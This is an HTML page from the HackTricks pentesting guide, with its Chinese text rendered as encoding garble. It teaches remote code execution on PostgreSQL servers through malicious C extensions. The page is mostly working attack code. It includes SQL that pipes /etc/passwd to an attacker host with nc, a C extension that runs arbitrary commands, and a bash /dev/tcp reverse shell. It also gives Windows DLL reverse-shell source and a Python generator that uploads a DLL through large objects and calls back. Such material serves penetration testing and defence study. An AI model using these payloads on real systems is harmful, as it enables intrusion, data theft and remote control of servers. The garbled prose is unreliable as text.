<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>RCE with PostgreSQL Extensions</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="rce-with-postgresql-extensions"><a class="header" href="#rce-with-postgresql-extensions">RCE with PostgreSQL Extensions</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="postgresql-æ‰©å±•"><a class="header" href="#postgresql-æ‰©å±•">PostgreSQL æ‰©å±•</a></h2>
<p>PostgreSQL çš„å¼€å‘ä»¥å¯æ‰©å±•æ€§ä¸ºæ ¸å¿ƒç‰¹æ€§ï¼Œå…è®¸å®ƒæ— ç¼é›†æˆæ‰©å±•ï¼Œå°±åƒå®ƒä»¬æ˜¯å†…ç½®åŠŸèƒ½ä¸€æ ·ã€‚è¿™äº›æ‰©å±•ï¼ŒåŸºæœ¬ä¸Šæ˜¯ç”¨ C ç¼–å†™çš„åº“ï¼Œä¸ºæ•°æ®åº“æä¾›é¢å¤–çš„å‡½æ•°ã€è¿ç®—ç¬¦æˆ–ç±»å‹ã€‚</p>
<p>ä» 8.1 ç‰ˆæœ¬å¼€å§‹ï¼Œå¯¹æ‰©å±•åº“æ–½åŠ äº†ç‰¹å®šè¦æ±‚ï¼šå®ƒä»¬å¿…é¡»ä½¿ç”¨ç‰¹æ®Šå¤´æ–‡ä»¶ç¼–è¯‘ã€‚æ²¡æœ‰è¿™ä¸ªï¼ŒPostgreSQL å°†ä¸ä¼šæ‰§è¡Œå®ƒä»¬ï¼Œç¡®ä¿åªä½¿ç”¨å…¼å®¹ä¸”å¯èƒ½å®‰å…¨çš„æ‰©å±•ã€‚</p>
<p>æ­¤å¤–ï¼Œè¯·è®°ä½ <strong>å¦‚æœä½ ä¸çŸ¥é“å¦‚ä½•</strong> <a href="big-binary-files-upload-postgresql.html"><strong>åˆ©ç”¨ PostgreSQL ä¸Šä¼ æ–‡ä»¶åˆ°å—å®³è€…ï¼Œä½ åº”è¯¥é˜…è¯»è¿™ç¯‡æ–‡ç« ã€‚</strong></a></p>
<h3 id="linux-ä¸­çš„-rce"><a class="header" href="#linux-ä¸­çš„-rce">Linux ä¸­çš„ RCE</a></h3>
<p><strong>æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ï¼š <a href="https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/">https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/</a></strong></p>
<p>ä» PostgreSQL 8.1 åŠæ›´æ—©ç‰ˆæœ¬æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„è¿‡ç¨‹å·²ç»è¢«æ¸…æ¥šåœ°è®°å½•ï¼Œå¹¶ä¸”ç›¸å¯¹ç®€å•ã€‚å¯ä»¥ä½¿ç”¨è¿™ä¸ªï¼š<a href="https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload">Metasploit æ¨¡å—</a>ã€‚</p>
<pre><code class="language-sql">CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc &lt;attacker IP&gt; &lt;attacker port&gt;');

# You can also create functions to open and write files
CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION close(int) RETURNS int AS '/lib/libc.so.6', 'close' LANGUAGE 'C' STRICT;
</code></pre>
<details>
<summary>ä» base64 å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶</summary>
<p>è¦åœ¨ postgres ä¸­å°†äºŒè¿›åˆ¶å†™å…¥æ–‡ä»¶ï¼Œæ‚¨å¯èƒ½éœ€è¦ä½¿ç”¨ base64ï¼Œè¿™å¯¹è¿™ä¸ªé—®é¢˜ä¼šå¾ˆæœ‰å¸®åŠ©ï¼š</p>
<pre><code class="language-sql">CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS
$$
DECLARE
fh int;
s int;
w bytea;
i int;
BEGIN
SELECT open(textout(file)::cstring, 522, 448) INTO fh;

IF fh &lt;= 2 THEN
RETURN 1;
END IF;

SELECT decode(s, 'base64') INTO w;

i := 0;
LOOP
EXIT WHEN i &gt;= octet_length(w);

SELECT write(fh,textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;

IF rs &lt; 0 THEN
RETURN 2;
END IF;

i := i + 1;
END LOOP;

SELECT close(fh) INTO rs;

RETURN 0;

END;
$$ LANGUAGE 'plpgsql';
</code></pre>
</details>
<p>ç„¶è€Œï¼Œå½“åœ¨æ›´é«˜ç‰ˆæœ¬ä¸Šå°è¯•æ—¶<strong>æ˜¾ç¤ºäº†ä»¥ä¸‹é”™è¯¯</strong>ï¼š</p>
<pre><code class="language-c">ERROR:  incompatible library â€œ/lib/x86_64-linux-gnu/libc.so.6â€: missing magic block
HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro.
</code></pre>
<p>æ­¤é”™è¯¯åœ¨<a href="https://www.postgresql.org/docs/current/static/xfunc-c.html">PostgreSQLæ–‡æ¡£</a>ä¸­æœ‰è§£é‡Šï¼š</p>
<blockquote>
<p>ä¸ºäº†ç¡®ä¿åŠ¨æ€åŠ è½½çš„å¯¹è±¡æ–‡ä»¶ä¸ä¼šåŠ è½½åˆ°ä¸å…¼å®¹çš„æœåŠ¡å™¨ä¸­ï¼ŒPostgreSQLæ£€æŸ¥æ–‡ä»¶æ˜¯å¦åŒ…å«å…·æœ‰é€‚å½“å†…å®¹çš„â€œé­”æœ¯å—â€ã€‚è¿™ä½¿å¾—æœåŠ¡å™¨èƒ½å¤Ÿæ£€æµ‹æ˜æ˜¾çš„ä¸å…¼å®¹æ€§ï¼Œä¾‹å¦‚ä¸ºä¸åŒä¸»è¦ç‰ˆæœ¬çš„PostgreSQLç¼–è¯‘çš„ä»£ç ã€‚ä»PostgreSQL 8.2å¼€å§‹ï¼Œé­”æœ¯å—æ˜¯å¿…éœ€çš„ã€‚è¦åŒ…å«é­”æœ¯å—ï¼Œè¯·åœ¨åŒ…å«å¤´æ–‡ä»¶fmgr.hä¹‹åï¼Œåœ¨æ¨¡å—æºæ–‡ä»¶ä¸­çš„ä¸€ä¸ªï¼ˆä¸”ä»…ä¸€ä¸ªï¼‰ä½ç½®å†™å…¥ï¼š</p>
<p><code>#ifdef PG_MODULE_MAGIC</code><br />
<code>PG_MODULE_MAGIC;</code><br />
<code>#endif</code></p>
</blockquote>
<p>è‡ªPostgreSQL 8.2ç‰ˆæœ¬ä»¥æ¥ï¼Œæ”»å‡»è€…åˆ©ç”¨ç³»ç»Ÿçš„è¿‡ç¨‹å˜å¾—æ›´åŠ å…·æœ‰æŒ‘æˆ˜æ€§ã€‚æ”»å‡»è€…éœ€è¦ä½¿ç”¨ç³»ç»Ÿä¸Šå·²ç»å­˜åœ¨çš„åº“ï¼Œæˆ–è€…ä¸Šä¼ è‡ªå®šä¹‰åº“ã€‚æ­¤è‡ªå®šä¹‰åº“å¿…é¡»é’ˆå¯¹å…¼å®¹çš„PostgreSQLä¸»è¦ç‰ˆæœ¬è¿›è¡Œç¼–è¯‘ï¼Œå¹¶ä¸”å¿…é¡»åŒ…å«ç‰¹å®šçš„â€œé­”æœ¯å—â€ã€‚è¿™ä¸€æªæ–½æ˜¾è‘—å¢åŠ äº†åˆ©ç”¨PostgreSQLç³»ç»Ÿçš„éš¾åº¦ï¼Œå› ä¸ºå®ƒéœ€è¦å¯¹ç³»ç»Ÿçš„æ¶æ„å’Œç‰ˆæœ¬å…¼å®¹æ€§æœ‰æ›´æ·±å…¥çš„ç†è§£ã€‚</p>
<h4 id="ç¼–è¯‘åº“"><a class="header" href="#ç¼–è¯‘åº“">ç¼–è¯‘åº“</a></h4>
<p>è·å–PostgreSQLç‰ˆæœ¬ï¼š</p>
<pre><code class="language-sql">SELECT version();
PostgreSQL 9.6.3 on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18) 6.3.0 20170516, 64-bit
</code></pre>
<p>ä¸ºäº†å…¼å®¹æ€§ï¼Œä¸»è¦ç‰ˆæœ¬å¿…é¡»å¯¹é½ã€‚å› æ­¤ï¼Œä½¿ç”¨9.6.xç³»åˆ—ä¸­çš„ä»»ä½•ç‰ˆæœ¬ç¼–è¯‘åº“åº”ç¡®ä¿æˆåŠŸé›†æˆã€‚</p>
<p>è¦åœ¨æ‚¨çš„ç³»ç»Ÿä¸­å®‰è£…è¯¥ç‰ˆæœ¬ï¼š</p>
<pre><code class="language-bash">apt install postgresql postgresql-server-dev-9.6
</code></pre>
<p>å¹¶ç¼–è¯‘åº“ï¼š</p>
<pre><code class="language-c">//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
#include &lt;string.h&gt;
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
char* command = PG_GETARG_CSTRING(0);
PG_RETURN_INT32(system(command));
}
</code></pre>
<p>ç„¶åä¸Šä¼ ç¼–è¯‘å¥½çš„åº“å¹¶ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œï¼š</p>
<pre><code class="language-bash">CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1"');
#Notice the double single quotes are needed to scape the qoutes
</code></pre>
<p>æ‚¨å¯ä»¥æ‰¾åˆ°è¿™ä¸ª <strong>é¢„ç¼–è¯‘çš„åº“</strong> é€‚ç”¨äºå¤šä¸ªä¸åŒçš„ PostgreSQL ç‰ˆæœ¬ï¼Œç”šè‡³å¯ä»¥ <strong>è‡ªåŠ¨åŒ–è¿™ä¸ªè¿‡ç¨‹</strong>ï¼ˆå¦‚æœæ‚¨æœ‰ PostgreSQL è®¿é—®æƒé™ï¼‰ï¼š</p>
<p>{% embed url="https://github.com/Dionach/pgexec" %}</p>
<h3 id="windows-ä¸­çš„-rce"><a class="header" href="#windows-ä¸­çš„-rce">Windows ä¸­çš„ RCE</a></h3>
<p>ä»¥ä¸‹ DLL ä»¥ <strong>äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°</strong> å’Œæ‚¨æƒ³è¦æ‰§è¡Œçš„ <strong>æ¬¡æ•°</strong> ä½œä¸ºè¾“å…¥å¹¶æ‰§è¡Œå®ƒï¼š</p>
<pre><code class="language-c">#include "postgres.h"
#include &lt;string.h&gt;
#include "fmgr.h"
#include "utils/geo_decls.h"
#include &lt;stdio.h&gt;
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

/* retrieve the second argument that is passed to the function (an integer)
that will serve as our counter limit*/

int instances = PG_GETARG_INT32(1);

for (int c = 0; c &lt; instances; c++) {
/*launch the process passed in the first parameter*/
ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
}
PG_RETURN_VOID();
}
</code></pre>
<p>æ‚¨å¯ä»¥åœ¨æ­¤ zip æ–‡ä»¶ä¸­æ‰¾åˆ°ç¼–è¯‘çš„ DLLï¼š</p>
<p>{% file src="../../../.gitbook/assets/pgsql_exec.zip" %}</p>
<p>æ‚¨å¯ä»¥æŒ‡ç¤ºæ­¤ DLL <strong>è¦æ‰§è¡Œå“ªä¸ªäºŒè¿›åˆ¶æ–‡ä»¶</strong> ä»¥åŠæ‰§è¡Œçš„æ¬¡æ•°ï¼Œåœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œå®ƒå°†æ‰§è¡Œ <code>calc.exe</code> 2 æ¬¡ï¼š</p>
<pre><code class="language-bash">CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);
</code></pre>
<p>åœ¨<a href="https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html"><strong>è¿™é‡Œ</strong></a>ä½ å¯ä»¥æ‰¾åˆ°è¿™ä¸ªåå‘ shellï¼š</p>
<pre><code class="language-c">#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"

#include "postgres.h"
#include &lt;string.h&gt;
#include "fmgr.h"
#include "utils/geo_decls.h"
#include &lt;winsock2.h&gt;

#pragma comment(lib,"ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL,
_In_ DWORD fdwReason,
_In_ LPVOID lpvReserved)
{
WSADATA wsaData;
SOCKET wsock;
struct sockaddr_in server;
char ip_addr[16];
STARTUPINFOA startupinfo;
PROCESS_INFORMATION processinfo;

char *program = "cmd.exe";
const char *ip = PG_REVSHELL_CALLHOME_SERVER;
u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);

WSAStartup(MAKEWORD(2, 2), &amp;wsaData);
wsock = WSASocket(AF_INET, SOCK_STREAM,
IPPROTO_TCP, NULL, 0, 0);

struct hostent *host;
host = gethostbyname(ip);
strcpy_s(ip_addr, sizeof(ip_addr),
inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));

server.sin_family = AF_INET;
server.sin_port = htons(port);
server.sin_addr.s_addr = inet_addr(ip_addr);

WSAConnect(wsock, (SOCKADDR*)&amp;server, sizeof(server),
NULL, NULL, NULL, NULL);

memset(&amp;startupinfo, 0, sizeof(startupinfo));
startupinfo.cb = sizeof(startupinfo);
startupinfo.dwFlags = STARTF_USESTDHANDLES;
startupinfo.hStdInput = startupinfo.hStdOutput =
startupinfo.hStdError = (HANDLE)wsock;

CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
NULL, NULL, &amp;startupinfo, &amp;processinfo);

return TRUE;
}

#pragma warning(pop) /* re-enable 4996 */

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);

PG_FUNCTION_INFO_V1(add_one);

Datum dummy_function(PG_FUNCTION_ARGS)
{
int32 arg = PG_GETARG_INT32(0);

PG_RETURN_INT32(arg + 1);
}
</code></pre>
<p>æ³¨æ„åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<strong>æ¶æ„ä»£ç ä½äº DllMain å‡½æ•°å†…éƒ¨</strong>ã€‚è¿™æ„å‘³ç€åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸éœ€è¦åœ¨ postgresql ä¸­æ‰§è¡ŒåŠ è½½çš„å‡½æ•°ï¼Œåªéœ€<strong>åŠ è½½ DLL</strong> å°±ä¼š<strong>æ‰§è¡Œ</strong>åå‘ shellï¼š</p>
<pre><code class="language-c">CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
</code></pre>
<p>The <a href="https://github.com/rop-la/PolyUDF">PolyUDF project</a> ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„èµ·ç‚¹ï¼Œæä¾›å®Œæ•´çš„ MS Visual Studio é¡¹ç›®å’Œä¸€ä¸ªç°æˆçš„åº“ï¼ˆåŒ…æ‹¬ï¼š<em>command eval</em>ã€<em>exec</em> å’Œ <em>cleanup</em>ï¼‰ä»¥åŠå¤šç‰ˆæœ¬æ”¯æŒã€‚</p>
<h3 id="æœ€æ–°-postgresql-ç‰ˆæœ¬ä¸­çš„-rce"><a class="header" href="#æœ€æ–°-postgresql-ç‰ˆæœ¬ä¸­çš„-rce">æœ€æ–° PostgreSQL ç‰ˆæœ¬ä¸­çš„ RCE</a></h3>
<p>åœ¨ <strong>æœ€æ–°ç‰ˆæœ¬</strong> çš„ PostgreSQL ä¸­ï¼Œå·²æ–½åŠ é™åˆ¶ï¼Œ<code>superuser</code> <strong>è¢«ç¦æ­¢</strong> ä»ç‰¹å®šç›®å½•ä»¥å¤–çš„åœ°æ–¹ <strong>åŠ è½½</strong> å…±äº«åº“æ–‡ä»¶ï¼Œä¾‹å¦‚ Windows ä¸Šçš„ <code>C:\Program Files\PostgreSQL\11\lib</code> æˆ– *nix ç³»ç»Ÿä¸Šçš„ <code>/var/lib/postgresql/11/lib</code>ã€‚è¿™äº›ç›®å½•å¯¹ NETWORK_SERVICE æˆ– postgres è´¦æˆ·çš„å†™æ“ä½œæ˜¯ <strong>å®‰å…¨çš„</strong>ã€‚</p>
<p>å°½ç®¡æœ‰è¿™äº›é™åˆ¶ï¼Œç»è¿‡èº«ä»½éªŒè¯çš„æ•°æ®åº“ <code>superuser</code> ä»ç„¶å¯ä»¥ä½¿ç”¨â€œå¤§å‹å¯¹è±¡â€ <strong>å°†äºŒè¿›åˆ¶æ–‡ä»¶å†™å…¥</strong> æ–‡ä»¶ç³»ç»Ÿã€‚æ­¤åŠŸèƒ½æ‰©å±•åˆ°åœ¨ <code>C:\Program Files\PostgreSQL\11\data</code> ç›®å½•ä¸­å†™å…¥ï¼Œè¿™å¯¹äºæ›´æ–°æˆ–åˆ›å»ºè¡¨ç­‰æ•°æ®åº“æ“ä½œè‡³å…³é‡è¦ã€‚</p>
<p>ä¸€ä¸ªæ˜¾è‘—çš„æ¼æ´æ¥è‡ªäº <code>CREATE FUNCTION</code> å‘½ä»¤ï¼Œå®ƒ <strong>å…è®¸ç›®å½•éå†</strong> è¿›å…¥æ•°æ®ç›®å½•ã€‚å› æ­¤ï¼Œç»è¿‡èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥ <strong>åˆ©ç”¨è¿™ç§éå†</strong> å°†å…±äº«åº“æ–‡ä»¶å†™å…¥æ•°æ®ç›®å½•ï¼Œç„¶å <strong>åŠ è½½å®ƒ</strong>ã€‚æ­¤æ¼æ´ä½¿æ”»å‡»è€…èƒ½å¤Ÿæ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œåœ¨ç³»ç»Ÿä¸Šå®ç°æœ¬åœ°ä»£ç æ‰§è¡Œã€‚</p>
<h4 id="æ”»å‡»æµç¨‹"><a class="header" href="#æ”»å‡»æµç¨‹">æ”»å‡»æµç¨‹</a></h4>
<p>é¦–å…ˆï¼Œæ‚¨éœ€è¦ <strong>ä½¿ç”¨å¤§å‹å¯¹è±¡ä¸Šä¼  dll</strong>ã€‚æ‚¨å¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹ï¼š</p>
<p>{% content-ref url="big-binary-files-upload-postgresql.md" %}
<a href="big-binary-files-upload-postgresql.html">big-binary-files-upload-postgresql.md</a>
{% endcontent-ref %}</p>
<p>ä¸€æ—¦æ‚¨å°†æ‰©å±•ï¼ˆåœ¨æ­¤ç¤ºä¾‹ä¸­åä¸º poc.dllï¼‰ä¸Šä¼ åˆ°æ•°æ®ç›®å½•ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åŠ è½½å®ƒï¼š</p>
<pre><code class="language-c">create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
</code></pre>
<p><em>æ³¨æ„ï¼Œæ‚¨ä¸éœ€è¦é™„åŠ  <code>.dll</code> æ‰©å±•åï¼Œå› ä¸ºåˆ›å»ºå‡½æ•°ä¼šè‡ªåŠ¨æ·»åŠ å®ƒã€‚</em></p>
<p>æœ‰å…³æ›´å¤šä¿¡æ¯ <strong>è¯·é˜…è¯»</strong><a href="https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html"> <strong>åŸå§‹å‡ºç‰ˆç‰©</strong></a><strong>ã€‚</strong><br />
åœ¨è¯¥å‡ºç‰ˆç‰©ä¸­ <strong>è¿™æ˜¯</strong> <a href="https://github.com/sourceincite/tools/blob/master/pgpwn.c"><strong>ç”¨äºç”Ÿæˆ postgres æ‰©å±•çš„ä»£ç </strong></a> (<em>è¦äº†è§£å¦‚ä½•ç¼–è¯‘ postgres æ‰©å±•ï¼Œè¯·é˜…è¯»ä¹‹å‰çš„ä»»ä½•ç‰ˆæœ¬</em>).<br />
åœ¨åŒä¸€é¡µé¢ä¸Š <strong>æä¾›äº†è‡ªåŠ¨åŒ–</strong> æ­¤æŠ€æœ¯çš„ <strong>åˆ©ç”¨</strong>ï¼š</p>
<pre><code class="language-python">#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
print("(+) usage %s &lt;connectback&gt; &lt;port&gt; &lt;dll/so&gt;" % sys.argv[0])
print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
start = i * 2048
end   = (i+1) * 2048
if i == 0:
sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
else:
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
end   = (i+1) * 2048
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
</code></pre>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
